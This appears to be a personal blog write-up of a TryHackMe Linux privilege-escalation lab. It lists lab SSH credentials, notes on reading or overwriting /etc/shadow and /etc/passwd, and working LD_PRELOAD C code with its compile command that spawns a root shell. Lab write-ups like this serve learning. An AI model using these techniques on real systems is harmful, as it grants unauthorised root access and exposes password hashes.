---
layout: post
title: LinuxPrivEsc oh THM
subtitle: Difficulty level - Medium
cover-img: /assets/img/linuxprivesc/cover.png
thumbnail-img: /assets/img/linuxprivesc/logo.jpeg
share-img: /assets/img/linuxprivesc/logo.jpeg
tags: [privesc, linux]
---

Blog Post for Linux privesc methods

SSH - user@<ip>
    password - password321

## Service Exploits  

Mysql exploit => https://www.exploit-db.com/exploits/1518 

Might have issue with /usr/lib/..plugin => https://www.root-me.org/?page=forum&id_thread=5072  

## Weak file permission  

1) Readable etc/shadow => cat it and then crack using john (rare occurance)   

2) Writeable etc/shadow => make new password and edit /etc/shadow

3) Writeable etc/passwd => use openssl to make a new passwd (openssl passwd newpass) and then paste in /etc/passwd after root:<here>: 

4) Shell escape seq => gtfobins :)
                        if apache2 can be run as sudo, use apache2 -f /etc/shadow to read starting lines of file, which contains the hash

5) Environment Variables => LD_PRELOAD loads shared object and LD_LIBRARY_PATH loads shared directories 

When using LD_PRELOAD this C code resets it and sets suid to 0,0,0 (root) and then spawns a shell  


```C

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);           //suid being set here also similar to what there was in cve-2021-4034 polkit pkexec
        system("/bin/bash -p");
}

```

Compiling command is  

```bash

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

``` 

And what it means [explainshell](https://explainshell.com/explain?cmd=gcc+-fPIC+-shared+-nostartfiles+-o+%2Ftmp%2Fpreload.so+%2Fhome%2Fuser%2Ftools%2Fsudo%2Fpreload.c)

**See what ldd command does** 

Shows shared files used by packages  

Had some issue with apache2 bad username try to fix it next time!